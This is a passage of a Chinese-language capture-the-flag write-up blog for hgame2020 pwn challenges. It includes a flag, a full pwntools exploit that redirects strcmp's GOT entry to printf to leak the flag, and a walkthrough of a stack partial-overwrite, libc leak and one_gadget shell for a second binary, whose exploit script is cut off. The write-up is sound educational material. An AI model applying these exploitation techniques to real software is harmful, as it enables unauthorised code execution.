|</span><br><span class="line">|_|   \___/|_|  |_| |_|_| |_|\__,_|_.__/ </span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Login System</span><br><span class="line">Account:Password:%s</span><br><span class="line">hgame&#123;VGhlX2Fub3RoZXJfd2F5X3RvX2hlYXZlbg==&#125;Wrong Password!</span><br><span class="line">Forgot your password?(y/n)</span><br></pre></td></tr></table></figure></div><h3 id="0x2-exp-1"><a href="#0x2-exp-1" class="headerlink" title="0x2 exp"></a>0x2 exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Another_Heaven'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">p = process(local_file)</span><br><span class="line">libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">p = remote(host, port)</span><br><span class="line">libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment">#info</span></span><br><span class="line">strcmp_got = elf.got[<span class="string">'strcmp'</span>]</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'There is a back door..."Hacked by Annevi!"\n'</span>)</span><br><span class="line">sl(str(strcmp_got))</span><br><span class="line">sl(<span class="string">'\x26'</span>) <span class="comment"># strcmp_got -&gt; printf_got </span></span><br><span class="line">ru(<span class="string">'Password:'</span>)</span><br><span class="line">sl(<span class="string">'%s'</span>) <span class="comment"># strcmp(password,flag) -&gt; printf("%s",flag)</span></span><br><span class="line">flag = ru(<span class="string">'Wrong Password!\n'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'flag is: '</span> + flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="形而上的坏死"><a href="#形而上的坏死" class="headerlink" title="形而上的坏死"></a>形而上的坏死</h2><ul><li>题目描述：Can you deceive the world？The lonely observer！</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_4/Metaphysical_Necrosis" target="_blank" rel="noopener">Metaphysical_Necrosis</a></li><li>考察点：视力(官方)</li><li>难度：中等</li><li>分值：400</li><li>完成人数：19</li></ul><h3 id="0x0-准备工作"><a href="#0x0-准备工作" class="headerlink" title="0x0 准备工作"></a>0x0 准备工作</h3><p>首先查保护机制，能打开的都打开了。。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div><p>先执行一下程序，熟悉下程序的流程：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./Metaphysical_Necrosis</span></span><br><span class="line">这一天，你在路上偶遇了睿智的逆向出题人:The eternal God Y!</span><br><span class="line">只见他拿着一把AWP不知道在那瞄谁。</span><br><span class="line">他发现了你，喜出望外:兄弟，包给你快去下包，我帮你架点!</span><br><span class="line">你要把C4安放在哪里呢？</span><br><span class="line">5</span><br><span class="line">AAAA</span><br><span class="line">the bomb has been planted!</span><br><span class="line"></span><br><span class="line">a few moments later~</span><br><span class="line">快过年了，正好有一条养了一年多的金枪鱼最近看起来闷闷不乐。</span><br><span class="line">不如把它宰了，吃一顿大餐，你说吼不吼啊！</span><br><span class="line"></span><br><span class="line">但是这一年多对它也有了些许感情，因此为了纪念它，你决定给它起个名字:Chutiren</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">接下来开始切菜，你打算把它切成几段呢？</span><br><span class="line">2</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">为了满足每个人不同的口味，每一段都打算用不同的烹饪方法。顺带一提，我喜欢糖醋金枪鱼</span><br><span class="line">第0段打算怎么料理呢：0000</span><br><span class="line">第1段打算怎么料理呢：1111</span><br><span class="line">接下来你打算把剩下的鱼骨头做成标本。</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">|                                                         |</span><br><span class="line">Chutiren</span><br><span class="line">|                                                         |</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">就在此时，你发现了一根茄子，这根茄子居然已经把锅里的金枪鱼吃了大半。</span><br><span class="line"></span><br><span class="line">仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。</span><br><span class="line"></span><br><span class="line">你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:</span><br><span class="line">5</span><br><span class="line">E99p1ant落地后，发现旁边居然有一个C4……Bomb！Terrorist Win</span><br><span class="line">AAAA</span><br><span class="line">E99p1ant不甘地大喊:啊~~！~？~…____</span><br><span class="line"></span><br><span class="line">E99p1ant变成了茄酱。</span><br><span class="line">[1]    13687 segmentation fault (core dumped)  ./Metaphysical_Necrosis</span><br></pre></td></tr></table></figure></div><h3 id="0x1-程序分析"><a href="#0x1-程序分析" class="headerlink" title="0x1 程序分析"></a>0x1 程序分析</h3><p><code>game()</code>函数在<code>main()</code>中被调用：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">game</span><span class="params">()</span></span>&#123;</span><br><span class="line">  __int64 ji_duan; <span class="comment">// [rsp+0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">160</span>]; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1008);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1040);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1098);</span><br><span class="line">  HIDWORD(v2) = readi();</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"the bomb has been planted!"</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"a few moments later~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_10F0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1148);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  read_n(name, <span class="number">48L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"------------------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1238);</span><br><span class="line">  HIDWORD(ji_duan) = readi();</span><br><span class="line">  <span class="keyword">if</span> ( SHIDWORD(ji_duan) &gt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_1278);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"------------------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_12A0);</span><br><span class="line">  LODWORD(ji_duan) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( BYTE4(ji_duan) &gt; ji_duan )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_1320, ji_duan, ji_duan, v2);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v4[<span class="number">8</span> * ji_duan], <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">    read_n(&amp;v4[<span class="number">8</span> * ji_duan], <span class="number">8L</span>L);</span><br><span class="line">    LODWORD(ji_duan) = ji_duan + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1348);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                                                         |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                                                         |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1400);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_1468);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_14D8);</span><br><span class="line">  LODWORD(v2) = readi();</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">6u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant_0);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(&amp;e99 + <span class="number">8</span> * v3, <span class="number">8L</span>L);</span><br><span class="line">    <span class="built_in">puts</span>(aE99p1ant_1);</span><br><span class="line">    flag1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_15D8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h3><p>主要的漏洞如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你要把C4安放在哪里呢？</span></span><br><span class="line">HIDWORD(v2) = readi();</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">8u</span>LL);  </span><br><span class="line"><span class="comment">// 改写栈地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:</span></span><br><span class="line">LODWORD(v2) = readi();</span><br><span class="line"><span class="built_in">puts</span>(aE99p1ant);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, &amp;v5[<span class="number">8</span> * HIDWORD(v2)], <span class="number">6u</span>LL);</span><br><span class="line"><span class="comment">// 泄漏栈地址，地址同被改写栈地址</span></span><br></pre></td></tr></table></figure></div><p>首先，确定一下能够被改写的栈地址：</p><ul><li><p><code>readi()</code>读<code>0</code>，让<code>HIDWORD(v2)=0</code>   </p></li><li><p><code>read(0, &amp;v5[8 * HIDWORD(v2)], 8uLL);</code>时，栈分布如下：</p></li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdad0 —▸ 0x555555554f30 (__libc_csu_init)</span><br><span class="line">0x7fffffffdad8 ◂— 0x78b2cb0fd0178500</span><br><span class="line">0x7fffffffdae0 —▸ 0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init)</span><br><span class="line">0x7fffffffdae8 —▸ 0x555555554f28 (main+14)</span><br><span class="line">0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init) </span><br><span class="line">0x7fffffffdaf8 —▸ 0x7ffff7debb6b (__libc_start_main+235)</span><br></pre></td></tr></table></figure></div><p>其中<code>0x7fffffffdad0</code>是<code>v5</code>的地址，其后依次是：</p><ul><li><code>canary</code></li><li><code>saved rbp1</code></li><li><code>game</code>的返回地址</li><li><code>saved rbp2</code></li><li><code>main</code>的返回地址</li></ul><p>先前被改写的栈地址，在之后的  <code>write(1, &amp;v5[8 * HIDWORD(v2)], 6uLL);</code>中又被泄漏出来</p><p>这里可以选择<code>readi()</code>读<code>3</code>泄漏程序的基址，也可以选择<code>readi()</code>读<code>5</code>泄漏<code>libc</code>的基址</p><p>泄漏程序基址似乎没啥用</p><p>虽然开了随机化保护，但是<code>libc</code>函数的后三位是不变的</p><p>于是可以覆盖<code>main</code>的返回地址<code>__libc_start_main+235</code>的末两位</p><h3 id="0x3-漏洞利用"><a href="#0x3-漏洞利用" class="headerlink" title="0x3 漏洞利用"></a>0x3 漏洞利用</h3><p>题目给了<code>libc</code>，看一下<code>__libc_start_main</code>，其中<code>0x00020830</code>是<code>__libc_start_main+235</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00020808      488d442420     lea rax, [rsp + 0x20]</span><br><span class="line">0x0002080d      644889042500.  mov qword fs:[0x300], rax</span><br><span class="line">0x00020816      488b059b363a.  mov rax, qword [reloc.__environ_184]</span><br><span class="line">0x0002081d      488b742408     mov rsi, qword [rsp + 8]</span><br><span class="line">0x00020822      8b7c2414       mov edi, dword [rsp + 0x14]</span><br><span class="line">0x00020826      488b10         mov rdx, qword [rax]</span><br><span class="line">0x00020829      488b442418     mov rax, qword [rsp + 0x18]</span><br><span class="line">0x0002082e      ffd0           call rax</span><br><span class="line">0x00020830      89c7           mov edi, eax</span><br></pre></td></tr></table></figure></div><p>这题的关键是，想要完成攻击，修改栈地址的漏洞至少要利用<strong>两次</strong>：泄漏<code>libc</code>一次，<code>getshell</code>一次</p><p><code>__libc_start_main</code>中<code>0x0002082e</code>这里的<code>call rax</code>就是<code>call main</code></p><p>所以，覆盖<code>__libc_start_main+235</code>的末两位为<code>08</code></p><p>这样既可以泄漏<code>__libc_start_main</code>，又能让程序再执行一遍<code>main</code></p><p>泄漏出来<code>libc</code>后计算<code>one_gadget</code>的地址：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> one_gadget ./libc-2.23.so                 </span></span><br><span class="line">0x45216 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset_addr = <span class="number">0x20808</span></span><br><span class="line">offset_one_gadget = <span class="number">0x45216</span></span><br><span class="line">one_gadget = addr - offset_addr + offset_one_gadget</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] ret: 0x7f2f53727808</span><br><span class="line">[*] one_gadget: 0x7f2f5374c216</span><br></pre></td></tr></table></figure></div><p>在第二次执行<code>main</code>时，覆盖返回地址为<code>one_gadget</code>即可<code>getshell</code></p><p>对了，题目中这里，有提示要再次执行<code>main()</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag1 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  read_n(&amp;e99 + <span class="number">8</span> * v3, <span class="number">8L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(aE99p1ant_1);  </span><br><span class="line">  flag1 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_15D8);  <span class="comment">// 嗯？！世界线……被改变了，我的Reading Steiner触发了！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="0x4-exp"><a href="#0x4-exp" class="headerlink" title="0x4 exp"></a>0x4 exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Metaphysical_Necrosis'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'libc-2.23.so'</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> 